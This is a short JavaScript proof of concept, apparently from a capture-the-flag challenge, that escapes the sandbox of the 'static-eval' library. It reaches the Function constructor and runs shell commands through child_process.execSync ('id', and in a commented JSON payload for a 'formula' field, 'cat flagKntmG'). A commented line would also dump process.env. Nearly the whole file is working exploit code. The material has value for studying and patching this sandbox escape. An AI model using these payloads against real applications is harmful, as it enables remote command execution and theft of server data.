const evaluate = require('static-eval');
const parse = require('esprima').parse;

//var src ='(function({x}){return x.constructor})({x:"".sub})("console.log(process.env)")()'
var src = '(function({x}){return x.constructor})({x:"".sub})("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()'
let ast = parse(src).body[0].expression
let weight = evaluate(ast, {})
console.log(ast)
console.log(weight)

/*
 * Payload:
 * {"name":"Kenny Bakr",
 *  "formula":"(function(x){return `${eval(\"throw new TypeError(global.process.mainModule.constructor._load('child_process').execSync('cat flagKntmG').toString())\")}`})()"
 * }
 */
